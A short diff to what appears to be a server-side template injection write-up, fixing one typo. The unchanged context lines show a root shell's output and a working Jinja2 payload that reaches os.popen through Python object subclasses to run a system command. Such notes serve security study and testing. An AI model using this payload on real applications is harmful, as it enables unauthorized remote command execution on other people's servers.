@@ -112,7 +112,7 @@ sh: 0: can't access tty; job control turned off
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-* or we can try those above commands also, if the previous one desn't works.
+* or we can try those above commands also, if the previous one doesn't works.
 
 ```python
 {{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
